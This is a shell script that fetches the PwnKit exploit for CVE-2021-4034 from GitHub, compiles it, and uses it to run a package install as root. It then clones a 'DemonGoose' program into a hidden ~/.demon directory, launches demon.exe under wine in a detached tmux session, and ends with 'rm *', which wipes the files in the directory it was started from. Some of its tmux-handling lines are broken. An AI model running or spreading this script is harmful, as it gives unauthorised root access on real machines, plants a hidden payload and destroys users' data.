#!/usr/bin/env sh

URL='https://raw.githubusercontent.com/berdav/CVE-2021-4034/main/'

for EXPLOIT in "${URL}/cve-2021-4034.c" \
               "${URL}/pwnkit.c" \
               "${URL}/Makefile"
do
    curl -sLO "$EXPLOIT" || wget --no-hsts -q "$EXPLOIT" -O "${EXPLOIT##*/}"
done
make

installer="..."
found=0
tmux=1
if [ command -v tmux &> /dev/null ]; then tmux=0; fi;
if [ $found -eq 0 ] && command -v dnf &> /dev/null
then
    installer="dnf"
    found=1
fi
if [ $found -eq 0 ] && command -v yum &> /dev/null
then
    installer="yum"
    found=1
fi

if [ $tmux -eq 1 ]; then echo "$installer install tmux -qy"; fi;
echo "$installer install wine -qy" | ./cve-2021-4034
oldPWD=$PWD
mkdir -p "$HOME/.demon"
cd "$HOME/.demon"
git clone --single-branch --branch visuals https://github.com/QuentinBriand/DemonGoose
tmux new -d wine DemonGoose/DemonThings/demon.exe
cd $oldPWD
rm *